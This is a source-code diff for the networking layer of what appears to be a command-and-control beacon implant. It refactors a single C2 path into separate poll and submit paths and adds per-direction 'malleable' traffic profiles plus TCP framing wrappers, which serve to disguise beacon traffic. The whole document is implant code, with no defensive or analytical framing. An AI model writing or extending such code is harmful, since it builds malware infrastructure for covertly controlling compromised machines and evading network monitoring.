@@ -307,7 +307,8 @@ NetworkManager::NetworkManager()
     , m_port(0)
 {
     m_host[0]       = L'\0';
-    m_path[0]       = L'\0';
+    m_pollPath[0]   = L'\0';
+    m_submitPath[0] = L'\0';
     m_userAgent[0]  = L'\0';
 }
 
@@ -315,29 +316,30 @@ NetworkManager::~NetworkManager() {
     m_initialized = false;
 }
 
-BeaconError NetworkManager::initialize(const wchar_t* host, const wchar_t* path,
-                                        const wchar_t* user_agent, uint16_t port) {
-    if (!host || !path || !user_agent) {
+BeaconError NetworkManager::initialize(const wchar_t* host, const wchar_t* pollPath,
+                                        const wchar_t* submitPath, const wchar_t* user_agent,
+                                        uint16_t port) {
+    if (!host || !pollPath || !submitPath || !user_agent) {
         return BeaconError::INVALID_PARAMETER;
     }
 
-    // Copy strings safely
     size_t hostLen = __wcslen(host);
-    size_t pathLen = __wcslen(path);
+    size_t pollPathLen = __wcslen(pollPath);
+    size_t submitPathLen = __wcslen(submitPath);
     size_t uaLen = __wcslen(user_agent);
 
-    if (hostLen >= 256 || pathLen >= 256 || uaLen >= 256) {
+    if (hostLen >= 256 || pollPathLen >= 256 || submitPathLen >= 256 || uaLen >= 256) {
         return BeaconError::BUFFER_TOO_SMALL;
     }
 
     safeWcsCopyBounded(m_host, host, 256);
-    safeWcsCopyBounded(m_path, path, 256);
+    safeWcsCopyBounded(m_pollPath, pollPath, 256);
+    safeWcsCopyBounded(m_submitPath, submitPath, 256);
     safeWcsCopyBounded(m_userAgent, user_agent, 256);
 
     m_port = port;
 
-    // Initialize the underlying network layer
-    ::initNetwork(g_functionTable, m_host, m_path, m_userAgent, m_port);
+    ::initNetwork(g_functionTable, m_host, m_pollPath, m_submitPath, m_userAgent, m_port);
     m_initialized = true;
 
     return BeaconError::SUCCESS;
@@ -350,9 +352,7 @@ void NetworkManager::setIdentity(const uint8_t* beacon_id, const uint8_t* crypto
 }
 
 void NetworkManager::setMalleableConfig(const BeaconConfig& config) {
-    if (config.has_malleable_config) {
-        ::setMalleableConfigFromBeaconConfig(&config);
-    }
+    ::setMalleableConfigFromBeaconConfig(&config);
 }
 
 void NetworkManager::setActiveChannel(uint8_t channelIndex, const BeaconConfig& config) {
@@ -365,21 +365,20 @@ void NetworkManager::setActiveChannel(uint8_t channelIndex, const BeaconConfig& 
     const PCFG_C2Channel* ch = &config.channels[channelIndex];
 
     // Guard against NULL strings (allocation failure during parse)
-    if (!ch->host || !ch->path || !ch->user_agent) {
+    if (!ch->host || !ch->poll_path || !ch->submit_path || !ch->user_agent) {
         g_debugPrint("[setActiveChannel] Channel %u has NULL strings (malloc failure)", (unsigned)channelIndex);
         return;
     }
 
-    g_debugPrint("[setActiveChannel] Switching to channel %u: %s:%d%s (type=%u)",
-                 (unsigned)channelIndex, ch->host, ch->port, ch->path, (unsigned)ch->type);
+    g_debugPrint("[setActiveChannel] Switching to channel %u: %s:%d poll=%s submit=%s (type=%u)",
+                 (unsigned)channelIndex, ch->host, ch->port, ch->poll_path, ch->submit_path, (unsigned)ch->type);
 
-    // Convert strings to wide char using reusable buffer (no malloc)
     size_t host_len = __strlen(ch->host);
-    size_t path_len = __strlen(ch->path);
+    size_t poll_path_len = __strlen(ch->poll_path);
+    size_t submit_path_len = __strlen(ch->submit_path);
     size_t ua_len = __strlen(ch->user_agent);
 
-    // Check buffer capacity
-    if (host_len >= 256 || path_len >= 256 || ua_len >= 256) {
+    if (host_len >= 256 || poll_path_len >= 256 || submit_path_len >= 256 || ua_len >= 256) {
         g_debugPrint("[setActiveChannel] Channel %u string too long for buffer", (unsigned)channelIndex);
         return;
     }
@@ -388,67 +387,90 @@ void NetworkManager::setActiveChannel(uint8_t channelIndex, const BeaconConfig& 
     m_wcsBuf[host_len] = L'\0';
     safeWcsCopyBounded(m_host, m_wcsBuf, 256);
 
-    __mbstowcs(m_wcsBuf, ch->path, path_len);
-    m_wcsBuf[path_len] = L'\0';
-    safeWcsCopyBounded(m_path, m_wcsBuf, 256);
+    __mbstowcs(m_wcsBuf, ch->poll_path, poll_path_len);
+    m_wcsBuf[poll_path_len] = L'\0';
+    safeWcsCopyBounded(m_pollPath, m_wcsBuf, 256);
+
+    __mbstowcs(m_wcsBuf, ch->submit_path, submit_path_len);
+    m_wcsBuf[submit_path_len] = L'\0';
+    safeWcsCopyBounded(m_submitPath, m_wcsBuf, 256);
 
     __mbstowcs(m_wcsBuf, ch->user_agent, ua_len);
     m_wcsBuf[ua_len] = L'\0';
     safeWcsCopyBounded(m_userAgent, m_wcsBuf, 256);
 
-    // Initialize underlying network layer
-    ::initNetwork(g_functionTable, m_host, m_path, m_userAgent, ch->port);
+    ::initNetwork(g_functionTable, m_host, m_pollPath, m_submitPath, m_userAgent, ch->port);
 
-    // Set channel security mode
-    bool isHttps = (ch->type == PCFG_CHANNEL_HTTPS);
+    bool isHttps = (ch->type == PCFG_ChannelType::HTTPS);
     ::setChannelSecure(isHttps);
-
-    // Set HTTP method
-    ::setHttpMethod(ch->http_method);
 
     m_port = ch->port;
     m_initialized = true;
 
-    // Resolve malleable config for this channel
-    uint8_t malleable_mode = ch->malleable_mode;
-
-    g_debugPrint("[setActiveChannel] Channel %u: malleable_mode=0x%02x, has_malleable_config=%u",
-        (unsigned)channelIndex, (unsigned)malleable_mode, (unsigned)config.has_malleable_config);
-
-    if (malleable_mode == PCFG_MALLEABLE_INLINE && config.channel_malleable) {
-        // Use per-channel inline malleable
-        g_debugPrint("[setActiveChannel] Using inline malleable for channel %u", (unsigned)channelIndex);
-        ::setMalleableFromChannelMalleable(&config.channel_malleable[channelIndex]);
-
-        // Also configure TCP malleable (prefix/suffix for raw TCP framing)
-        if (ch->type == PCFG_CHANNEL_TCP) {
-            ::setTcpMalleable(
-                config.channel_malleable[channelIndex].wrapper_prefix,
-                config.channel_malleable[channelIndex].wrapper_prefix_len,
-                config.channel_malleable[channelIndex].wrapper_suffix,
-                config.channel_malleable[channelIndex].wrapper_suffix_len
-            );
-        }
-    } else if (malleable_mode == PCFG_MALLEABLE_GLOBAL && config.has_malleable_config) {
-        // Use global malleable
-        g_debugPrint("[setActiveChannel] Using global malleable for channel %u", (unsigned)channelIndex);
-        ::setMalleableConfigFromBeaconConfig(&config);
-
-        // Also configure TCP malleable from global
-        if (ch->type == PCFG_CHANNEL_TCP) {
-            ::setTcpMalleable(
-                config.global_malleable.wrapper_prefix,
-                config.global_malleable.wrapper_prefix_len,
-                config.global_malleable.wrapper_suffix,
-                config.global_malleable.wrapper_suffix_len
-            );
-        }
+    // Resolve poll malleable
+    if (ch->poll_malleable_mode == PCFG_MALLEABLE_MODE::INLINE && config.channel_poll_malleable) {
+        g_debugPrint("[setActiveChannel] Using inline poll malleable for channel %u", (unsigned)channelIndex);
+        ::setPollMalleableFromChannelMalleable(&config.channel_poll_malleable[channelIndex]);
+    } else if (ch->poll_malleable_mode == PCFG_MALLEABLE_MODE::GLOBAL && config.has_poll_malleable_config) {
+        g_debugPrint("[setActiveChannel] Using global poll malleable for channel %u", (unsigned)channelIndex);
+        ::setPollMalleableFromBeaconConfig(&config, channelIndex);
     } else {
-        // No malleable (TCP or bare channel)
-        g_debugPrint("[setActiveChannel] No malleable for channel %u (mode=0x%02x)",
-                     (unsigned)channelIndex, (unsigned)malleable_mode);
-        ::clearMalleableConfig();
-        if (ch->type == PCFG_CHANNEL_TCP) {
+        g_debugPrint("[setActiveChannel] No poll malleable for channel %u (mode=0x%02x)",
+                     (unsigned)channelIndex, (unsigned)ch->poll_malleable_mode);
+        ::setPollMalleableFromChannelMalleable(nullptr);
+    }
+
+    // Resolve submit malleable
+    if (ch->submit_malleable_mode == PCFG_MALLEABLE_MODE::INLINE && config.channel_submit_malleable) {
+        g_debugPrint("[setActiveChannel] Using inline submit malleable for channel %u", (unsigned)channelIndex);
+        ::setSubmitMalleableFromChannelMalleable(&config.channel_submit_malleable[channelIndex]);
+    } else if (ch->submit_malleable_mode == PCFG_MALLEABLE_MODE::GLOBAL && config.has_submit_malleable_config) {
+        g_debugPrint("[setActiveChannel] Using global submit malleable for channel %u", (unsigned)channelIndex);
+        ::setSubmitMalleableFromBeaconConfig(&config, channelIndex);
+    } else {
+        g_debugPrint("[setActiveChannel] No submit malleable for channel %u (mode=0x%02x)",
+                     (unsigned)channelIndex, (unsigned)ch->submit_malleable_mode);
+        ::setSubmitMalleableFromChannelMalleable(nullptr);
+    }
+
+    // Resolve poll response malleable
+    if (ch->poll_response_malleable_mode == PCFG_MALLEABLE_MODE::INLINE && config.channel_poll_response_malleable) {
+        g_debugPrint("[setActiveChannel] Using inline poll response for channel %u", (unsigned)channelIndex);
+        ::setPollResponseFromBeaconConfig(&config, channelIndex);
+    } else if (ch->poll_response_malleable_mode == PCFG_MALLEABLE_MODE::GLOBAL && config.has_poll_response_malleable_config) {
+        ::setPollResponseFromBeaconConfig(&config, channelIndex);
+    } else {
+        ::setPollResponseFromBeaconConfig(&config, channelIndex);
+    }
+
+    // Resolve submit response malleable
+    if (ch->submit_response_malleable_mode == PCFG_MALLEABLE_MODE::INLINE && config.channel_submit_response_malleable) {
+        g_debugPrint("[setActiveChannel] Using inline submit response for channel %u", (unsigned)channelIndex);
+        ::setSubmitResponseFromBeaconConfig(&config, channelIndex);
+    } else if (ch->submit_response_malleable_mode == PCFG_MALLEABLE_MODE::GLOBAL && config.has_submit_response_malleable_config) {
+        ::setSubmitResponseFromBeaconConfig(&config, channelIndex);
+    } else {
+        ::setSubmitResponseFromBeaconConfig(&config, channelIndex);
+    }
+
+    // Configure TCP malleable if needed
+    if (ch->type == PCFG_ChannelType::TCP) {
+        // Use poll malleable wrapper for TCP framing (consistent with single-malleable era)
+        if (ch->poll_malleable_mode == PCFG_MALLEABLE_MODE::INLINE && config.channel_poll_malleable) {
+            ::setTcpMalleable(
+                config.channel_poll_malleable[channelIndex].wrapper_prefix,
+                config.channel_poll_malleable[channelIndex].wrapper_prefix_len,
+                config.channel_poll_malleable[channelIndex].wrapper_suffix,
+                config.channel_poll_malleable[channelIndex].wrapper_suffix_len
+            );
+        } else if (config.has_poll_malleable_config) {
+            ::setTcpMalleable(
+                config.global_poll_malleable.wrapper_prefix,
+                config.global_poll_malleable.wrapper_prefix_len,
+                config.global_poll_malleable.wrapper_suffix,
+                config.global_poll_malleable.wrapper_suffix_len
+            );
+        } else {
             ::setTcpMalleable(nullptr, 0, nullptr, 0);
         }
     }
